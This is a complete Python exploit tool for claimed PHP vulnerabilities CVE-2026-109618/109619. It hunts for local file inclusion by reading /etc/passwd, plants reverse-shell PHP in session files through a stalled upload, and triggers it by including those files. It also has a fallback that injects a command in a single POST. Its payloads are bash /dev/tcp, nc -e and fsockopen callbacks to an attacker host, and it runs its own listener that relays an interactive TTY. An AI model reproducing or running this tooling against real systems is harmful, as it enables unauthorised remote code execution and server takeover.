#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell_rev.py - wild reverse shell for CVE-2026-109618 / CVE-2026-109619
================================================================================
listener + exploit + interactive TTY, one file, stdlib only.

Chain
-----
  PHP2Shell's strongest primitive writes attacker-controlled bytes into a PHP
  session file (the uploaded filename is stored verbatim by the rfc1867
  handler).  We drop a DETACHED reverse-shell payload there and trigger an
  include() through an LFI.  Because the payload setsid()s and backgrounds,
  the shell outlives the request.

Shell variants (auto-fallback bash -> nc -> php)
  bash : setsid bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'   (needs bash)
  nc   : setsid nc LHOST LPORT -e /bin/bash                      (needs netcat -e)
  php  : fsockopen() loop, no external binaries                  (dies at max_execution_time)

Timing note
-----------
  upload_progress_<key> is DELETED from the session when the upload finishes,
  so the include() must fire while the upload socket is still stalled open.
  That is exactly what --slow-hold gives you.

Usage
-----
  python3 php2shell_rev.py -t http://10.0.0.5 -l 10.0.0.1 -p 4444
  python3 php2shell_rev.py -t http://10.0.0.5 --lfi 'http://10.0.0.5/vuln.php?page=FUZZ'
  python3 php2shell_rev.py --listen-only -p 4444
"""

from __future__ import annotations
import argparse, json, os, re, select, socket, ssl, sys, threading, time
import urllib.error, urllib.parse, urllib.request, uuid

UA = "php2shell_rev/1.0"
OK, BAD, INF, WRN = "[+]", "[-]", "[*]", "[!]"
def ok(m):  print(f"{OK} {m}", flush=True)
def bad(m): print(f"{BAD} {m}", flush=True)
def inf(m): print(f"{INF} {m}", flush=True)
def wrn(m): print(f"{WRN} {m}", flush=True)

# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------
class Resp:
    __slots__ = ("status", "headers", "body", "url")
    def __init__(self, s, h, b, u):
        self.status, self.headers, self.body, self.url = s, h, b, u
    @property
    def text(self): return self.body.decode("utf-8", "replace")

class Client:
    def __init__(self, base, verify=False, timeout=20):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.cookies = {}
        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        self.ctx = ctx

    def _store(self, h):
        try:
            for line in h.get_all("Set-Cookie") or []:
                first = line.split(";", 1)[0]
                if "=" in first:
                    k, v = first.split("=", 1)
                    self.cookies[k.strip()] = v.strip()
        except Exception:
            pass

    def req(self, method, path, data=None, headers=None, cookie=None, timeout=None):
        url = path if path.startswith("http") else self.base + path
        r = urllib.request.Request(url, data=data, method=method)
        r.add_header("User-Agent", UA)
        ck = cookie if cookie is not None else "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if ck:
            r.add_header("Cookie", ck)
        for k, v in (headers or {}).items():
            r.add_header(k, v)
        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=self.ctx))
        try:
            with opener.open(r, timeout=timeout or self.timeout) as x:
                self._store(x.headers)
                return Resp(x.status, x.headers, x.read(), x.geturl())
        except urllib.error.HTTPError as e:
            self._store(e.headers)
            return Resp(e.code, e.headers, e.read(), url)
        except Exception as e:
            return Resp(0, {}, str(e).encode(), url)

    def get(self, p, **kw):  return self.req("GET", p, **kw)
    def post(self, p, **kw): return self.req("POST", p, **kw)

# --------------------------------------------------------------------------
# fingerprint / LFI
# --------------------------------------------------------------------------
PHP_FIXED = {(8, 5): (8, 5, 12), (8, 4): (8, 4, 27), (8, 3): (8, 3, 36), (8, 2): (8, 2, 35)}
PASSWD_RE = re.compile(rb"root:[^:\r\n]*:0:0:")
SESSION_PATHS = [
    "/var/lib/php/sessions", "/var/lib/php/session", "/var/lib/php5", "/var/lib/php",
    "/tmp", "/var/tmp", "/tmp/sessions", "/var/www/tmp",
    "/usr/local/var/lib/php/sessions", "/usr/local/lib/php/sessions",
    "C:/Windows/Temp", "C:/xampp/tmp",
]
LFI_PATHS = ["", "/index.php", "/vuln.php", "/lfi.php", "/file.php", "/page.php",
             "/view.php", "/include.php", "/test.php", "/demo.php"]
LFI_PARAMS_FULL = ["file", "page", "include", "path", "view", "template", "doc", "url",
                   "p", "f", "inc", "load", "filename", "src", "read", "name"]
LFI_PARAMS_FAST = ["file", "page", "include", "path", "view", "template", "f", "p"]

def parse_ver(s):
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", s or "")
    return tuple(int(x) for x in m.groups()) if m else None

def php_vuln(v):
    if not v: return None
    if v[0] < 8: return True
    fix = PHP_FIXED.get((v[0], v[1]))
    return v < fix if fix else True

def php_fingerprint(cl):
    for p in ("/", "/index.php", "/phpinfo.php", "/info.php"):
        r = cl.get(p)
        hdr = (r.headers.get("X-Powered-By", "") or "") + " " + (r.headers.get("Server", "") or "")
        if "php" in hdr.lower():
            v = parse_ver(hdr)
            if v: return v, f"header: {hdr.strip()}"
        m = re.search(r"PHP Version\s*</td>\s*<td[^>]*>\s*([0-9]+\.[0-9]+\.[0-9]+)", r.text, re.I)
        if m: return parse_ver(m.group(1)), "phpinfo()"
    return None, "unknown"

def find_lfi(cl, fast=False):
    for p in LFI_PATHS:
        for q in (LFI_PARAMS_FAST if fast else LFI_PARAMS_FULL):
            r = cl.get(f"{p}?{q}=/etc/passwd")
            if r.status == 200 and PASSWD_RE.search(r.body):
                return (p or "/"), q
    return None, None

def split_lfi(url):
    u = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qs(u.query)
    return u.path or "/", (next(iter(qs)) if qs else "file")

# --------------------------------------------------------------------------
# session poisoning (slow upload keeps the progress entry alive)
# --------------------------------------------------------------------------
def establish_session(cl, base, sid):
    cl.get("/", cookie=f"PHPSESSID={sid}")
    return cl.cookies.get("PHPSESSID", sid)

def slow_upload(base, sid, payload, path="/index.php"):
    u = urllib.parse.urlsplit(base)
    host, port = u.hostname, (u.port or (443 if u.scheme == "https" else 80))
    b = "----rev" + uuid.uuid4().hex[:10]
    pre = (f'--{b}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
           f'--{b}\r\nContent-Disposition: form-data; name="file"; filename="{payload}"\r\n'
           f'Content-Type: application/octet-stream\r\n\r\n').encode()
    filler = b"B" * 8192
    tail = f"\r\n--{b}--\r\n".encode()
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nCookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={b}\r\n"
            f"Content-Length: {len(pre)+len(filler)+len(tail)}\r\nConnection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=10)
    if u.scheme == "https":
        s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
    s.sendall(head + pre + filler)
    return s, tail

# --------------------------------------------------------------------------
# payloads
# --------------------------------------------------------------------------
def build_payload(variant, lhost, lport):
    if variant == "bash":
        return ("<?php exec('setsid bash -c \\'bash -i >& /dev/tcp/%s/%d 0>&1\\' "
                ">/dev/null 2>&1 &');?>" % (lhost, lport))
    if variant == "nc":
        return ("<?php exec('setsid nc %s %d -e /bin/bash >/dev/null 2>&1 &');?>" % (lhost, lport))
    if variant == "php":
        return ("<?php $s=fsockopen('%s',%d);while($c=fread($s,1024)){"
                "$o=shell_exec($c);fwrite($s,$o);}?>" % (lhost, lport))
    raise ValueError(variant)

def rev_cmd(lhost, lport):
    return f"setsid bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >/dev/null 2>&1 &"

# --------------------------------------------------------------------------
# listener + TTY relay
# --------------------------------------------------------------------------
class Listener:
    def __init__(self, host, port):
        self.s = socket.socket()
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((host, port))
        self.s.listen(5)
        self.conn = None

    def accept(self, timeout=60):
        self.s.settimeout(timeout)
        try:
            self.conn, addr = self.s.accept()
            return addr
        except socket.timeout:
            return None

def relay(sock, upgrade=False):
    interactive = sys.stdin.isatty()
    if upgrade:
        try:
            sock.sendall(b"export TERM=xterm; python3 -c 'import pty;pty.spawn(\"/bin/bash\")' "
                         b"2>/dev/null || true\n")
            time.sleep(0.4)
        except Exception:
            pass
    if not interactive:
        try:
            while True:
                d = sock.recv(4096)
                if not d: break
                sys.stdout.write(d.decode("utf-8", "replace")); sys.stdout.flush()
        except KeyboardInterrupt:
            pass
        return
    import tty, termios
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        while True:
            r, _, _ = select.select([sock, fd], [], [], 0.2)
            if sock in r:
                try:
                    d = sock.recv(65536)
                except OSError:
                    break
                if not d: break
                os.write(sys.stdout.fileno(), d)
            if fd in r:
                d = os.read(fd, 4096)
                if not d: break
                sock.sendall(d)
    except KeyboardInterrupt:
        pass
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
        print()

def guess_lhost(host):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

# --------------------------------------------------------------------------
# rawkey fallback (no LFI required)
# --------------------------------------------------------------------------
def rawkey_fire(cl, base, command, path="/index.php"):
    big = "A" * (4 * 1024 * 1024)
    arm = ("a[a][b][c]=" + "x" * 1024 + "&" + big + "=1").encode()
    cl.post(path, data=arm, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=60)
    parts = ["a[a][b][c]=" + "x" * 1024] + [f"t[{i}]=" + "y" * 24 for i in range(149)]
    parts.append("z=" + urllib.parse.quote(command))
    body = "&".join(parts).encode()
    return cl.post(path, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=60)

# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------
def run(args):
    u = urllib.parse.urlsplit(args.target)
    lhost = args.lhost or guess_lhost(u.hostname)
    inf(f"target {args.target}")
    inf(f"callback {lhost}:{args.lport}")

    lst = Listener(args.bind, args.lport)
    ok(f"listener bound on {args.bind}:{args.lport}")

    if args.listen_only:
        addr = lst.accept(timeout=args.wait)
        if addr:
            ok(f"connection from {addr[0]}:{addr[1]}")
            relay(lst.conn, upgrade=args.upgrade)
        return 0

    cl = Client(args.target)
    ver, src = php_fingerprint(cl)
    if ver:
        v = php_vuln(ver)
        (ok if v else wrn)(f"PHP {'.'.join(map(str, ver))} ({src}) -> "
                           f"{'VULNERABLE' if v else 'PATCHED'}")

    if args.lfi:
        lfi_path, lfi_param = split_lfi(args.lfi)
    else:
        inf("hunting for an LFI sink ...")
        lfi_path, lfi_param = find_lfi(cl, fast=args.fast)
    if lfi_path:
        ok(f"LFI: {lfi_path}?{lfi_param}=FUZZ")
    else:
        wrn("no LFI -> rawkey single-POST fallback")

    variants = [args.shell] if args.shell != "auto" else ["bash", "nc", "php"]

    for variant in variants:
        inf(f"--- shell variant: {variant} ---")
        if not lfi_path:
            inf("rawkey: arming OOM then firing with reverse command")
            r = rawkey_fire(cl, args.target, rev_cmd(lhost, args.lport))
            inf(f"fire -> HTTP {r.status}")
            addr = lst.accept(timeout=args.wait)
            if addr:
                ok(f"shell from {addr[0]}:{addr[1]} (variant {variant})")
                relay(lst.conn, upgrade=args.upgrade)
                return 0
            bad(f"{variant}: no callback")
            continue

        payload = build_payload(variant, lhost, args.lport)
        sid = uuid.uuid4().hex[:26]
        sid = establish_session(cl, args.target, sid)

        sock, tail = slow_upload(args.target, sid, payload, path=args.upload_path)
        time.sleep(0.6)

        # fresh cookie-less client so we don't fight the session file lock
        trig = Client(args.target)
        for sp in SESSION_PATHS:
            target_file = f"{sp}/sess_{sid}"
            url = f"{lfi_path}?{lfi_param}={urllib.parse.quote(target_file)}"
            threading.Thread(target=lambda u=url: trig.get(u, timeout=args.wait),
                             daemon=True).start()

        addr = lst.accept(timeout=args.wait)
        try:
            sock.sendall(tail); sock.close()
        except Exception:
            pass

        if addr:
            ok(f"shell from {addr[0]}:{addr[1]} via {variant}")
            relay(lst.conn, upgrade=args.upgrade)
            return 0
        bad(f"{variant}: no callback, trying next")

    bad("no shell. widen --wait, check firewall on lport, or verify the LFI")
    return 1

def main():
    ap = argparse.ArgumentParser(prog="php2shell_rev",
                                 description="reverse shell for CVE-2026-109618/109619")
    ap.add_argument("-t", "--target", help="target base URL, e.g. http://10.0.0.5")
    ap.add_argument("-l", "--lhost", help="your callback IP (auto-detected if omitted)")
    ap.add_argument("-p", "--lport", type=int, default=4444, help="callback port")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--lfi", help="LFI template, e.g. 'http://h/vuln.php?page=FUZZ'")
    ap.add_argument("--upload-path", default="/index.php")
    ap.add_argument("--shell", choices=["auto", "bash", "nc", "php"], default="auto")
    ap.add_argument("--wait", type=int, default=20, help="seconds to wait for callback")
    ap.add_argument("--fast", action="store_true")
    ap.add_argument("--upgrade", action="store_true", help="auto-send pty upgrade")
    ap.add_argument("--listen-only", action="store_true")
    args = ap.parse_args()
    if not args.listen_only and not args.target:
        ap.error("-t/--target required (or use --listen-only)")
    try:
        return run(args)
    except KeyboardInterrupt:
        print()
        return 130

if __name__ == "__main__":
    sys.exit(main())
